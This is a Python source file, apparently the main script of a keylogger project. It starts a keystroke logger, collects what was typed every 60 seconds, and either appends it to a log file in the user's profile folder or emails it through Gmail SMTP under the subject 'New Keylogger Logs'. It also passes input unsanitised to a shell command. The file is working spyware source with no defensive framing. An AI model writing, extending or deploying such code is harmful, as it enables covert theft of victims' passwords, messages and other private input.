import os
import sys
import time
import subprocess
import smtplib
from src.keylogger import Keylogger

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))

def get_env_var(var):
    command = subprocess.Popen(f"echo {var}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    return command.stdout.read().decode("utf-8").strip().replace("\\", "/")

def save_text_locally(text, file_path):
    try:
        mode = "a" if os.path.exists(file_path) else "w"
        with open(file_path, mode, encoding="utf-8") as file:
            if mode == "w":
                file.write(f"{'-'*10}{time.strftime('%d/%m/%Y')} {time.strftime('%I:%M:%S')}{'-'*10}\n")
            file.write(text)
        return True
    except IOError:
        return False

def send_gmail(text, email, password):
    email_content = f"Subject: New Keylogger Logs\n\n{text}"
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp_server:
            smtp_server.ehlo()
            smtp_server.login(email, password)
            smtp_server.sendmail(email, email, email_content)
        return True
    except smtplib.SMTPResponseException:
        return False

class Main:
    def __init__(self, timer, export_path="", gmail="", gmail_pass=""):
        self.gmail = gmail
        self.gmail_pass = gmail_pass
        self.keylogger = Keylogger()
        self.timer = timer
        self.export_path = get_env_var(export_path)

    def start(self):
        self.keylogger.start()
        while True:
            time.sleep(self.timer)
            if not self.keylogger.keylogger_running:
                break
            key_log = self.keylogger.get_key_log().encode("utf-8", errors="replace").decode()
            if key_log:
                if self.gmail:
                    if send_gmail(key_log, self.gmail, self.gmail_pass):
                        self.keylogger.clear_key_log()
                else:
                    if save_text_locally(key_log, self.export_path):
                        self.keylogger.clear_key_log()

if __name__ == "__main__":
    Main(60, "%userprofile%\\log.txt").start()